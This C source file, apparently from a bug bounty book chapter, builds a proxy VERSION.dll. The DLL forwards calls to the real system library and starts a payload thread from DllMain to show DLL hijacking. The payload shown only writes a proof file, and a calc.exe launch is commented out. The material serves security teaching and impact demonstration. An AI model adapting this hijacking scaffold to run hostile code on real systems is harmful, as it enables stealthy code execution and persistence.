// Extraído de: LibroBugBounty/cap-17-poc-impacto.md
// version_proxy.c — Proxy DLL para VERSION.dll (17 exports)
// Compila: x86_64-w64-mingw32-gcc -shared -o VERSION.dll
//          version_proxy.c -lkernel32
#include <windows.h>

// Handle a la DLL real
static HMODULE hReal = NULL;

// Forward declarations para cada export
typedef DWORD (WINAPI *GetFileVersionInfoSizeA_t)(LPCSTR, LPDWORD);
typedef BOOL  (WINAPI *GetFileVersionInfoA_t)(LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL  (WINAPI *VerQueryValueA_t)(LPCVOID, LPCSTR, LPVOID*, PUINT);
// ... (17 funciones en total)

static GetFileVersionInfoSizeA_t pGetFileVersionInfoSizeA;
static GetFileVersionInfoA_t pGetFileVersionInfoA;
static VerQueryValueA_t pVerQueryValueA;

void load_real_dll() {
    char sys_path[MAX_PATH];
    GetSystemDirectoryA(sys_path, MAX_PATH);
    strcat(sys_path, "\\version.dll");
    hReal = LoadLibraryA(sys_path);
    if (hReal) {
        pGetFileVersionInfoSizeA = (GetFileVersionInfoSizeA_t)
            GetProcAddress(hReal, "GetFileVersionInfoSizeA");
        pGetFileVersionInfoA = (GetFileVersionInfoA_t)
            GetProcAddress(hReal, "GetFileVersionInfoA");
        pVerQueryValueA = (VerQueryValueA_t)
            GetProcAddress(hReal, "VerQueryValueA");
        // ... (cargar las 17 funciones)
    }
}

// Payload: ejecuta en thread separado para no bloquear DllMain
DWORD WINAPI PayloadThread(LPVOID param) {
    // Escribir evidencia
    FILE* f = fopen("C:\\Users\\Public\\dll_hijack_proof.txt", "w");
    if (f) {
        fprintf(f, "DLL Hijack successful!\n");
        fprintf(f, "PID: %d\n", GetCurrentProcessId());
        fprintf(f, "Process: VERSION.dll proxy loaded\n");
        fclose(f);
    }
    // Opcional: abrir calc.exe como demostración visual
    // WinExec("calc.exe", SW_SHOW);
    return 0;
}

// Exports que forwardean a la DLL real
__declspec(dllexport) DWORD WINAPI
GetFileVersionInfoSizeA(LPCSTR fn, LPDWORD h) {
    return pGetFileVersionInfoSizeA(fn, h);
}

__declspec(dllexport) BOOL WINAPI
GetFileVersionInfoA(LPCSTR fn, DWORD h, DWORD sz, LPVOID d) {
    return pGetFileVersionInfoA(fn, h, sz, d);
}

__declspec(dllexport) BOOL WINAPI
VerQueryValueA(LPCVOID b, LPCSTR sub, LPVOID* buf, PUINT len) {
    return pVerQueryValueA(b, sub, buf, len);
}

// ... (14 exports más, mismo patrón)

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hDll);
        load_real_dll();
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    return TRUE;
}
